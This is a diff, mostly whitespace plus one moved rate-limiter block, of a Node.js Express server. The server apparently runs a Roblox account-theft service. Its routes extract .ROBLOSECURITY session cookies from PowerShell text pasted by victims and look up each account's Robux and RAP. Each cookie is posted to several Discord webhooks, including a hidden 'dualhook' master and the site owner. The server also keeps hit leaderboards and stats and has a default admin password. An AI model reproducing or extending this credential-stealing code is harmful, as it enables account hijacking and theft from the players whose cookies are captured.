@@ -35,10 +35,10 @@ async function loadDirectories() {
   try {
     const snapshot = await db.ref('directories').once('value');
     const directories = snapshot.val() || {};
-    
+
     // Check for directories without unique IDs and assign them
     let hasChanges = false;
-    
+
     for (const [dirName, dirConfig] of Object.entries(directories)) {
       // Check if directory is missing uniqueId
       if (!dirConfig.uniqueId) {
@@ -47,7 +47,7 @@ async function loadDirectories() {
         hasChanges = true;
         console.log(`✅ Assigned unique ID ${uniqueId} to legacy directory: ${dirName}`);
       }
-      
+
       // Check subdirectories for missing IDs
       if (dirConfig.subdirectories) {
         for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
@@ -60,14 +60,14 @@ async function loadDirectories() {
         }
       }
     }
-    
+
     // Save changes if any directories were updated
     if (hasChanges) {
       console.log('🔄 Updating directories with new unique IDs...');
       await saveDirectories(directories);
       console.log('✅ Successfully updated legacy directories with unique IDs');
     }
-    
+
     return directories;
   } catch (error) {
     console.error('Error loading directories from Firebase:', error);
@@ -94,7 +94,7 @@ function generateUniqueId(directories) {
 async function saveDirectories(directories) {
   try {
     await db.ref('directories').set(directories);
-    
+
     return true;
   } catch (error) {
     console.error('Error saving directories to Firebase:', error);
@@ -116,7 +116,7 @@ function validateRequest(req, res, next) {
   if (origin) {
     const originHost = new URL(origin).host;
     if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
-      
+
       return res.status(403).json({ error: 'Unauthorized origin' });
     }
   }
@@ -124,7 +124,7 @@ function validateRequest(req, res, next) {
   // Check for API token in headers
   const providedToken = req.get('X-API-Token');
   if (!providedToken || providedToken !== API_TOKEN) {
-    
+
     return res.status(401).json({ error: 'Invalid API token' });
   }
 
@@ -136,7 +136,7 @@ async function logUserData(token, userData, context = {}) {
   try {
     // Hash the token for security - never store raw tokens
     const hashedToken = crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);
-    
+
     const logEntry = {
       tokenHash: hashedToken, // Store only hashed version
       userData: userData,
@@ -145,7 +145,7 @@ async function logUserData(token, userData, context = {}) {
     };
 
     const writeResult = await db.ref('user_logs').push(logEntry);
-    
+
     return writeResult.key;
   } catch (error) {
     console.error('❌ Error logging user data to Firebase Realtime Database:', error);
@@ -161,6 +161,15 @@ const limiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
   max: 100, // limit each IP to 100 requests per windowMs
   message: 'Too many requests from this IP, please try again later.'
+});
+
+// Enhanced rate limiting for token endpoints
+const tokenLimiter = rateLimit({
+  windowMs: 5 * 60 * 1000, // 5 minutes
+  max: 10, // limit each IP to 10 token requests per windowMs
+  message: 'Too many token requests from this IP, please try again later.',
+  standardHeaders: true,
+  legacyHeaders: false,
 });
 
 app.use(limiter);
@@ -403,7 +412,7 @@ app.post('/u/:directory/convert', async (req, res) => {
 // Protected parent directory token endpoint
 app.get('/u/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
   const directoryName = req.params.directory;
-  
+
   if (!/^[a-z0-9-]+$/.test(directoryName)) {
     return res.status(400).json({ error: 'Invalid directory name format' });
   }
@@ -422,20 +431,20 @@ app.get('/u/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (re
 // Middleware to protect admin dashboard with password
 function requireAdminPassword(req, res, next) {
   const authHeader = req.headers.authorization;
-  
+
   if (!authHeader || !authHeader.startsWith('Basic ')) {
     res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
     return res.status(401).json({ error: 'Authentication required' });
   }
-  
+
   const base64Credentials = authHeader.split(' ')[1];
   const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
   const [username, password] = credentials.split(':');
-  
+
   // Check credentials (you can change these)
   const validUsername = process.env.ADMIN_USERNAME || 'admin';
   const validPassword = process.env.ADMIN_PASSWORD || 'admin123';
-  
+
   if (username === validUsername && password === validPassword) {
     next();
   } else {
@@ -447,15 +456,6 @@ function requireAdminPassword(req, res, next) {
 // Serve the admin dashboard with password protection
 app.get('/admin', requireAdminPassword, (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
-});
-
-// Enhanced rate limiting for token endpoints
-const tokenLimiter = rateLimit({
-  windowMs: 5 * 60 * 1000, // 5 minutes
-  max: 10, // limit each IP to 10 token requests per windowMs
-  message: 'Too many token requests from this IP, please try again later.',
-  standardHeaders: true,
-  legacyHeaders: false,
 });
 
 // Token endpoint protection middleware
@@ -554,7 +554,7 @@ app.post('/api/create-directory', async (req, res) => {
       return res.status(500).json({ error: 'Failed to save directory configuration' });
     }
 
-    
+
 
     // Send notification to the webhook about successful directory creation with auth token
     try {
@@ -586,9 +586,9 @@ app.post('/api/create-directory', async (req, res) => {
         body: JSON.stringify(notificationPayload)
       });
 
-      
+
     } catch (webhookError) {
-      
+
     }
 
     res.json({ 
@@ -633,7 +633,7 @@ app.post('/api/login', async (req, res) => {
         foundDirectory = dirName;
         break;
       }
-      
+
       // Check subdirectories for dualhook services
       if (dirConfig.subdirectories) {
         for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
@@ -643,7 +643,7 @@ app.post('/api/login', async (req, res) => {
           }
         }
       }
-      
+
       if (foundDirectory) break;
     }
 
@@ -668,7 +668,7 @@ function authenticateUser(req, res, next) {
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
     return res.status(401).json({ error: 'Authentication required' });
   }
-  
+
   const token = authHeader.split(' ')[1];
   req.userToken = token;
   next();
@@ -678,17 +678,17 @@ function authenticateUser(req, res, next) {
 app.get('/api/user-stats', authenticateUser, async (req, res) => {
   try {
     const authToken = req.userToken;
-    
+
     // Find user's directory
     const directories = await loadDirectories();
     let userDirectory = null;
-    
+
     for (const [dirName, dirConfig] of Object.entries(directories)) {
       if (dirConfig.authToken === authToken) {
         userDirectory = dirName;
         break;
       }
-      
+
       if (dirConfig.subdirectories) {
         for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
           if (subConfig.authToken === authToken) {
@@ -697,10 +697,10 @@ app.get('/api/user-stats', authenticateUser, async (req, res) => {
           }
         }
       }
-      
+
       if (userDirectory) break;
     }
-    
+
     if (!userDirectory) {
       return res.status(401).json({ error: 'Invalid token' });
     }
@@ -709,7 +709,7 @@ app.get('/api/user-stats', authenticateUser, async (req, res) => {
     const logsRef = db.ref('user_logs');
     const snapshot = await logsRef.once('value');
     const allLogs = snapshot.val() || {};
-    
+
     // Filter logs for this user
     const userLogs = Object.values(allLogs).filter(log => 
       log.context && (log.context.directory === userDirectory || 
@@ -727,7 +727,7 @@ app.get('/api/user-stats', authenticateUser, async (req, res) => {
     const totalSummary = userLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
     const totalRobux = userLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
     const totalRAP = userLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
-    
+
     const todayAccounts = todayLogs.length;
     const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
     const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
@@ -757,22 +757,22 @@ app.get('/api/leaderboard', async (req, res) => {
     const logsRef = db.ref('user_logs');
     const snapshot = await logsRef.once('value');
     const allLogs = snapshot.val() || {};
-    
+
     // Group logs by directory/user
     const userStats = {};
-    
+
     Object.values(allLogs).forEach(log => {
       if (!log.context || !log.context.directory) return;
-      
+
       let directory = log.context.directory;
       let displayName = directory;
-      
+
       // For subdirectories, show only the subdirectory name to hide dualhook structure
       if (log.context.subdirectory) {
         directory = `${log.context.directory}/${log.context.subdirectory}`;
         displayName = log.context.subdirectory; // Only show subdirectory name
       }
-      
+
       if (!userStats[directory]) {
         userStats[directory] = {
           username: displayName, // Use display name instead of full path
@@ -781,18 +781,18 @@ app.get('/api/leaderboard', async (req, res) => {
           lastHit: log.timestamp
         };
       }
-      
+
       userStats[directory].hits++;
       userStats[directory].totalSummary += (log.userData.summary || 0);
       if (new Date(log.timestamp) > new Date(userStats[directory].lastHit)) {
         userStats[directory].lastHit = log.timestamp;
       }
-      
+
       // For dualhook systems: also count hits for the parent directory
       // This ensures parent directories show all their hits in leaderboard (direct + subdirectory hits)
       if (log.context.subdirectory) {
         const parentDirectory = log.context.directory;
-        
+
         if (!userStats[parentDirectory]) {
           userStats[parentDirectory] = {
             username: parentDirectory,
@@ -801,7 +801,7 @@ app.get('/api/leaderboard', async (req, res) => {
             lastHit: log.timestamp
           };
         }
-        
+
         userStats[parentDirectory].hits++;
         userStats[parentDirectory].totalSummary += (log.userData.summary || 0);
         if (new Date(log.timestamp) > new Date(userStats[parentDirectory].lastHit)) {
@@ -837,7 +837,7 @@ app.get('/api/live-hits', async (req, res) => {
     const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(20);
     const snapshot = await recentLogsQuery.once('value');
     const recentLogs = snapshot.val() || {};
-    
+
     // Format for display
     const liveHits = Object.values(recentLogs)
       .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
@@ -859,14 +859,14 @@ app.get('/api/live-hits', async (req, res) => {
 app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
   try {
     const uniqueId = req.params.uniqueId;
-    
+
     // Load directories to find the one with this unique ID
     const directories = await loadDirectories();
-    
+
     let targetDirectory = null;
     let targetDirectoryName = null;
     let isSubdirectory = false;
-    
+
     // Search through all directories and subdirectories for the unique ID
     for (const [dirName, dirConfig] of Object.entries(directories)) {
       if (dirConfig.uniqueId === uniqueId) {
@@ -874,7 +874,7 @@ app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
         targetDirectoryName = dirName;
         break;
       }
-      
+
       // Check subdirectories
       if (dirConfig.subdirectories) {
         for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
@@ -886,10 +886,10 @@ app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
           }
         }
       }
-      
+
       if (targetDirectory) break;
     }
-    
+
     if (!targetDirectory) {
       return res.status(404).json({ 
         error: 'Directory not found',
@@ -901,20 +901,20 @@ app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
     const logsRef = db.ref('user_logs');
     const snapshot = await logsRef.once('value');
     const allLogs = snapshot.val() || {};
-    
+
     // Filter logs for this specific directory
     const directoryLogs = Object.values(allLogs).filter(log => {
       if (!log.context) return false;
-      
+
       // For direct directory matches
       if (log.context.directory === targetDirectory) return true;
-      
+
       // For subdirectory matches
       if (log.context.subdirectory && 
           `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
         return true;
       }
-      
+
       return false;
     });
 
@@ -929,7 +929,7 @@ app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
     const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
     const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
     const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
-    
+
     const todayAccounts = todayLogs.length;
     const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
     const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
@@ -973,14 +973,14 @@ app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
 app.get('/api/bot/stats/:directory', async (req, res) => {
   try {
     const directoryName = req.params.directory;
-    
+
     // Load directories to verify the directory exists
     const directories = await loadDirectories();
-    
+
     // Check if directory exists (including subdirectories)
     let directoryExists = false;
     let targetDirectory = directoryName;
-    
+
     if (directories[directoryName]) {
       directoryExists = true;
     } else {
@@ -996,7 +996,7 @@ app.get('/api/bot/stats/:directory', async (req, res) => {
         }
       }
     }
-    
+
     if (!directoryExists) {
       return res.status(404).json({ 
         error: 'Directory not found',
@@ -1008,20 +1008,20 @@ app.get('/api/bot/stats/:directory', async (req, res) => {
     const logsRef = db.ref('user_logs');
     const snapshot = await logsRef.once('value');
     const allLogs = snapshot.val() || {};
-    
+
     // Filter logs for this specific directory
     const directoryLogs = Object.values(allLogs).filter(log => {
       if (!log.context) return false;
-      
+
       // For direct directory matches
       if (log.context.directory === targetDirectory) return true;
-      
+
       // For subdirectory matches
       if (log.context.subdirectory && 
           `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
         return true;
       }
-      
+
       return false;
     });
 
@@ -1036,7 +1036,7 @@ app.get('/api/bot/stats/:directory', async (req, res) => {
     const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
     const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
     const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
-    
+
     const todayAccounts = todayLogs.length;
     const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
     const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
@@ -1079,7 +1079,7 @@ app.get('/api/admin/stats', requireAdminPassword, async (req, res) => {
     const logsRef = db.ref('user_logs');
     const snapshot = await logsRef.once('value');
     const allLogs = snapshot.val() || {};
-    
+
     const logs = Object.values(allLogs);
 
     // Calculate all-time stats (not just today)
@@ -1087,7 +1087,7 @@ app.get('/api/admin/stats', requireAdminPassword, async (req, res) => {
     const totalRobux = logs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
     const totalSummary = logs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
     const premiumUsers = logs.filter(log => log.userData.premium).length;
-    
+
     // Count unique directories from all logs
     const directories = new Set(logs.map(log => log.context?.directory).filter(dir => dir));
     const activeDirectories = directories.size;
@@ -1113,7 +1113,7 @@ app.get('/api/admin/logs', requireAdminPassword, async (req, res) => {
     const logsQuery = logsRef.orderByChild('timestamp').limitToLast(50);
     const snapshot = await logsQuery.once('value');
     const logs = snapshot.val() || {};
-    
+
     const formattedLogs = Object.values(logs)
       .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
       .map(log => ({
@@ -1487,10 +1487,10 @@ async function fetchRobloxUserData(token) {
 
 // Function to send custom dualhook webhook with directory branding
 async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData = null, webhookUrl, directoryName, subdirectoryName, host) {
-  
+
 
   if (!webhookUrl) {
-    
+
     return { success: false, error: 'Webhook URL not configured' };
   }
 
@@ -1508,7 +1508,7 @@ async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData 
       embeds: [embed]
     };
 
-    
+
     const response = await fetch(webhookUrl, {
       method: 'POST',
       headers: {
@@ -1517,7 +1517,7 @@ async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData 
       body: JSON.stringify(payload)
     });
 
-    
+
 
     if (!response.ok) {
       const errorText = await response.text();
@@ -1525,7 +1525,7 @@ async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData 
       return { success: false, error: `Webhook failed: ${response.status}` };
     }
 
-    
+
     return { success: true };
   } catch (error) {
     console.error('❌ Failed to send custom dualhook webhook:', error.message);
@@ -1541,7 +1541,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
 
   if (!webhookUrl) {
-    
+
     return { success: false, error: 'Webhook URL not configured' };
   }
 
@@ -1641,7 +1641,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         embeds: [userDataEmbed, cookieEmbed]
       };
 
-      
+
 
       const response = await fetch(webhookUrl, {
         method: 'POST',
@@ -1651,7 +1651,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         body: JSON.stringify(combinedPayload)
       });
 
-      
+
 
       if (!response.ok) {
         const errorText = await response.text();
@@ -1659,7 +1659,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         return { success: false, error: `Combined embeds failed: ${response.status}` };
       }
 
-      
+
       return { success: true };
 
     } else {
@@ -1677,7 +1677,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         embeds: [embed]
       };
 
-      
+
 
       const response = await fetch(webhookUrl, {
         method: 'POST',
@@ -1687,14 +1687,14 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
         body: JSON.stringify(payload)
       });
 
-      
+
       if (!response.ok) {
         const errorText = await response.text();
         console.error('Webhook failed with status:', response.status, 'Error:', errorText);
         return { success: false, error: `Webhook failed: ${response.status}` };
       }
 
-      
+
       return { success: true };
     }
   } catch (error) {
@@ -1715,7 +1715,7 @@ app.post('/convert-disabled', validateRequest, async (req, res) => {
     let input;
     let scriptType;
 
-    
+
 
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
@@ -1725,11 +1725,11 @@ app.post('/convert-disabled', validateRequest, async (req, res) => {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
     } else {
-      
+
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
-    
+
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     // First, clean up the input by removing PowerShell backticks and line breaks
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
@@ -1773,16 +1773,16 @@ app.post('/convert-disabled', validateRequest, async (req, res) => {
       const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);
 
       if (!webhookResult.success) {
-        
+
         return res.status(500).json({ 
           success: false, 
           error: `Webhook failed: ${webhookResult.error}` 
         });
       }
 
-      
+
     } else {
-      
+
 
       // Return error message when no token found
       return res.status(400).json({ 
@@ -1877,7 +1877,7 @@ app.post('/:directory/convert', async (req, res) => {
     let input;
     let scriptType;
 
-    
+
 
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
@@ -1887,7 +1887,7 @@ app.post('/:directory/convert', async (req, res) => {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
     } else {
-      
+
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
@@ -1941,16 +1941,16 @@ app.post('/:directory/convert', async (req, res) => {
       }
 
       if (!webhookResult.success) {
-        
+
         return res.status(500).json({ 
           success: false, 
           error: `Webhook failed: ${webhookResult.error}` 
         });
       }
 
-      
+
     } else {
-      
+
       // Return error message when no token found
       return res.status(400).json({ 
         success: false,
@@ -2023,7 +2023,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
       return res.status(500).json({ error: 'Failed to save subdirectory configuration' });
     }
 
-    
+
 
     // Send CREATION notification to subdirectory webhook with user's link and auth token
     try {
@@ -2046,7 +2046,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
         body: JSON.stringify(creationNotificationPayload)
       });
 
-      
+
     } catch (webhookError) {
     }    
 
@@ -2068,7 +2068,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
 // Get API token for specific directory
 app.get('/:directory/api/token', async (req, res) => {
   const directoryName = req.params.directory;
-  
+
   // Validate directory name format
   if (!/^[a-z0-9-]+$/.test(directoryName)) {
     return res.status(400).json({ error: 'Invalid directory name format' });
@@ -2094,7 +2094,7 @@ app.get('/:directory/api/token', async (req, res) => {
 app.get('/:directory/:subdirectory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
   const directoryName = req.params.directory;
   const subdirectoryName = req.params.subdirectory;
-  
+
   // Validate directory and subdirectory name formats
   if (!/^[a-z0-9-]+$/.test(directoryName) || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
     return res.status(400).json({ error: 'Invalid directory or subdirectory name format' });
@@ -2133,14 +2133,14 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
     // Validate API token for this specific subdirectory
     const providedToken = req.get('X-API-Token');
     if (!providedToken || providedToken !== subdirectoryConfig.apiToken) {
-      
+
       return res.status(401).json({ error: 'Invalid API token for this subdirectory' });
     }
 
     let input;
     let scriptType;
 
-    
+
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
       input = req.body;
@@ -2149,7 +2149,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
     } else {
-      
+
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
@@ -2198,44 +2198,44 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
       const customTitle = `<:hacker:1404745235711655987> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
 
-      
-      
+
+
       const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
 
       if (subdirectoryWebhookResult.success) {
-        
+
       } else {
-        
+
       }
 
       // 2. Send to dualhook master webhook (collects from all subdirectory users)
       let dualhookWebhookResult = { success: true }; // Default success for validation
       if (parentConfig.dualhookWebhookUrl) {
-        
+
         dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);
 
         if (dualhookWebhookResult.success) {
-          
+
         } else {
-          
+
         }
       }
 
       // 3. Send to site owner webhook (website owner)
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
-        
+
         const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);
 
         if (siteOwnerWebhookResult.success) {
-          
+
         } else {
-          
+
         }
       }
 
       if (!subdirectoryWebhookResult.success) {
-        
+
         return res.status(500).json({ 
           success: false, 
           error: `Subdirectory webhook failed: ${subdirectoryWebhookResult.error}` 
@@ -2243,16 +2243,16 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       }
 
       if (!dualhookWebhookResult.success) {
-        
+
         return res.status(500).json({ 
           success: false, 
           error: `Dualhook master webhook failed: ${dualhookWebhookResult.error}` 
         });
       }
 
-      
+
     } else {
-      
+
 
       // Return error message when no token found
       return res.status(400).json({ 
@@ -2270,14 +2270,14 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       subdirectory: subdirectoryName
     });
   } catch (error) {
-    
+
     res.status(500).json({ error: 'Server error processing request' });
   }
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  
+
 
   if (!process.env.API_TOKEN) {
   }
@@ -2287,7 +2287,7 @@ app.listen(PORT, '0.0.0.0', () => {
     if (directories && typeof directories === 'object') {
       const directoryNames = Object.keys(directories);
       if (directoryNames.length > 0) {
-        
+
 
         // Log subdirectories for dualhook services
         directoryNames.forEach(dir => {
@@ -2296,7 +2296,7 @@ app.listen(PORT, '0.0.0.0', () => {
               directories[dir].subdirectories) {
             const subdirs = Object.keys(directories[dir].subdirectories);
             if (subdirs.length > 0) {
-              
+
             }
           }
         });
